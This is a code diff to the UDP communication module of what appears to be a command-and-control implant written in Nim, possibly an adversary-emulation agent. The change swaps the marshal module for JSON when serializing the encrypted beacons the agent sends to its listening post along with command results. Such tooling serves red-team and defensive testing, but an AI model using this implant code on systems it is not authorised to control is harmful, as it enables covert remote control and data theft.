@@ -2,11 +2,11 @@ import strutils
 import strformat
 import os
 import net
-import marshal
 import logging
+import json
 from sequtils import concat
 from rawhttp import requestPayload
-from contact import Contact, Beacon, Instruction, jitterSleep
+from contact import Contact, Beacon, Instruction, jitterSleep, unmarshalBeacon
 from ../util/encoder import hexToSeqByte, seqByteToHex
 from ../util/cryptic import toString, toByteSeq, encrypt, decrypt
 from ../util/config import encryptionKey
@@ -19,7 +19,7 @@ proc udpBufferedSend(conn: Socket, beacon: Beacon, contact: Contact) =
     ## Sends the agent beacon over a buffered socket.
     ##
     # Marshall the beacon with Nim's fancy marshall operator.
-    var data: string = $$beacon
+    var data: string = $(%* beacon)
     let encryptedData: seq[byte] = encrypt(data, encryptionKey)
     # Convert the encrypted binary data to a hex string.
     var encryptedDataHex: string = seqByteToHex(encryptedData)
@@ -30,7 +30,7 @@ proc udpRespond(conn: Socket, beacon: Beacon, contact: Contact, message: string)
     ## Sends the result of a command execution to the listening post.
     ##
     var newBeacon: Beacon = beacon
-    var unmarshalledBeacon: Beacon = to[Beacon](toString(decrypt(hexToSeqByte(message.strip()), encryptionKey)))
+    var unmarshalledBeacon: Beacon = unmarshalBeacon(toString(decrypt(hexToSeqByte(message.strip()), encryptionKey)))
     newBeacon.Links = @[]
     for link in unmarshalledBeacon.Links:
         if len(link.Payload) > 0:
